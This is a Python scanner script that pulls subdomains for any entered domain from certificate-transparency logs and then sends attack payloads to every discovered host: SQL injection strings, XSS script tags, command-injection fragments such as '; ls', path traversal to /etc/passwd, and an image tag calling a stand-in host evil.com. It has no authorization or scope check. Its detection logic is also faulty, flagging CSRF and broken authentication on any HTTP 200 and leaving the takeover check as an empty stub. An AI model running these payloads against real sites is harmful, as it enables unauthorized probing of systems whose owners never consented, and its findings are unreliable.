import requests
import json
import time
import threading
from queue import Queue
import logging
import random
from urllib.parse import urlparse
import socket
import ssl

logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

def print_ascii_art():
    art = r"""
                _                ____ 
   ____  ____ _(_)___  _  __    / __ \
  / __ \/ __ `/ / __ \| |/_/   / / / /
 / / / / /_/ / / / / />  <    / /_/ / 
/_/ /_/\__, /_/_/ /_/_/|_|____\____/  
      /____/            /_____/       

https://github.com/nginx0
"""
    print(art)

def clean_domain(domain):
    domain = domain.strip().lower()
    domain = domain.replace("https://", "").replace("http://", "").replace("www.", "").rstrip("/")
    return domain

def fetch_certificates(domain, limit=10):
    domain = clean_domain(domain)
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    certificates = []
    start = 0

    while len(certificates) < limit:
        try:
            response = requests.get(url + f"&start={start}")
            response.raise_for_status()
            page_certificates = response.json()
            if not page_certificates:
                break
            certificates.extend(page_certificates)
            start += len(page_certificates)
            time.sleep(random.uniform(0.1, 0.5))
        except requests.RequestException as e:
            logging.error(f"Request failed for domain {domain} - {str(e)}")
            break
        except json.JSONDecodeError:
            logging.error("Error decoding the JSON response.")
            break

    return certificates[:limit]

def is_resolvable(domain):
    try:
        socket.gethostbyname(domain)
        return True
    except socket.error:
        return False

def threaded_resolution(domains, results, check_validity=False):
    while not domains.empty():
        domain = domains.get()
        try:
            if check_validity and is_resolvable(domain):
                results.add(domain)
            elif not check_validity:
                results.add(domain)
        except Exception as e:
            logging.error(f"Error processing domain {domain} - {str(e)}")
        finally:
            domains.task_done()

def extract_domains(certificates, check_validity=False):
    domains = set()
    domain_queue = Queue()
    
    for cert in certificates:
        if 'name_value' in cert:
            for domain in cert['name_value'].splitlines():
                domain = domain.strip().lower()
                if domain and not domain.startswith('*'):
                    domain_queue.put(domain)

    threads = []
    for _ in range(10):
        thread = threading.Thread(target=threaded_resolution, args=(domain_queue, domains, check_validity))
        thread.start()
        threads.append(thread)

    domain_queue.join()

    for thread in threads:
        thread.join()

    return domains

def ensure_http_scheme(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url

def test_vulnerability(url, payloads, vulnerability_type):
    vulnerabilities = []
    for payload in payloads:
        test_url = ensure_http_scheme(f"{url}?search={payload}")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        try:
            response = requests.get(test_url, headers=headers)
            if vulnerability_type == 'SQL Injection' and (
                response.status_code == 200 and ("error" in response.text or "SQL syntax" in response.text)):
                vulnerabilities.append(f"Potential SQL Injection vulnerability detected at {test_url}")
            elif vulnerability_type == 'XSS' and payload in response.text:
                vulnerabilities.append(f"Potential XSS vulnerability detected at {test_url}")
            elif vulnerability_type == 'CSRF' and response.status_code == 200:
                vulnerabilities.append(f"Potential CSRF vulnerability detected at {test_url}")
            elif vulnerability_type == 'Command Injection' and "ls" in response.text:
                vulnerabilities.append(f"Potential Command Injection vulnerability detected at {test_url}")
            elif vulnerability_type == 'File Inclusion' and "root:x:" in response.text:
                vulnerabilities.append(f"Potential File Inclusion vulnerability detected at {test_url}")
            elif vulnerability_type == 'Security Misconfiguration' and response.status_code == 200:
                vulnerabilities.append(f"Potential Security Misconfiguration detected at {test_url}")
            elif vulnerability_type == 'Broken Authentication' and response.status_code == 200:
                vulnerabilities.append(f"Potential Broken Authentication detected at {test_url}")
        except requests.RequestException as e:
            logging.error(f"Request failed for {test_url} - {str(e)}")
    return vulnerabilities

def check_ssl_tls(domain):
    logging.info(f"Checking SSL/TLS for {domain}...")
    try:
        conn = ssl.create_default_context().wrap_socket(
            socket.socket(socket.AF_INET),
            server_hostname=domain
        )
        conn.settimeout(5)
        conn.connect((domain, 443))
        ssl_info = conn.getpeercert()
        return ssl_info
    except Exception as e:
        logging.error(f"SSL/TLS check failed for {domain} - {str(e)}")
        return None

def check_subdomain_takeover(domain):
    logging.info(f"Checking for subdomain takeover for {domain}...")
    return None

def write_report(filename, data, ssl_tls_results=None, takeover_results=None):
    with open(filename, 'w') as file:
        for line in data:
            file.write(line + '\n')
        if ssl_tls_results:
            file.write("\nSSL/TLS Checks:\n")
            file.write(str(ssl_tls_results) + '\n')
        if takeover_results:
            file.write("\nSubdomain Takeover Checks:\n")
            file.write(takeover_results + '\n')

def main():
    print_ascii_art()
    domain = input("Enter the domain to discover subdomains: ")
    limit = int(input("Enter the number of certificates to fetch (default is 10): ") or 10)
    
    logging.info(f"Fetching certificates for domain: {domain}")
    certificates = fetch_certificates(domain, limit)

    if not certificates:
        logging.info("No certificates found.")
        return

    logging.info("Extracting domains from certificates...")
    discovered_domains = extract_domains(certificates, check_validity=True)

    logging.info("\nDiscovered subdomains:\n")
    for domain in discovered_domains:
        print(domain)
    print()

    report_data = ["Discovered Subdomains:"]
    report_data.extend(discovered_domains)
    report_data.append("")

    ssl_tls_results = "\n".join([str(check_ssl_tls(domain)) for domain in discovered_domains])
    takeover_results = "\n".join([str(check_subdomain_takeover(domain)) for domain in discovered_domains])

    vulnerability_tests = {
        'SQL Injection': ["' OR '1'='1", '" OR "1"="1', "' UNION SELECT NULL--"],
        'XSS': ["<script>alert('XSS')</script>", "javascript:alert('XSS')"],
        'CSRF': ["<img src='http://evil.com/csrf?cookie=12345'>"],
        'Command Injection': ["; ls", "| ls", "`ls`"],
        'File Inclusion': ["../../etc/passwd", "/etc/passwd"],
        'Security Misconfiguration': ["/admin"],
        'Broken Authentication': ["/login"]
    }

    for domain in discovered_domains:
        for vulnerability_type, payloads in vulnerability_tests.items():
            logging.info(f"Testing {domain} for {vulnerability_type}...")
            vulnerabilities = test_vulnerability(domain, payloads, vulnerability_type)
            for vuln in vulnerabilities:
                print(vuln)
                report_data.append(vuln)

    write_report("vulnerability_report.txt", report_data, ssl_tls_results, takeover_results)
    logging.info("Report written to vulnerability_report.txt")

if __name__ == "__main__":
    main()
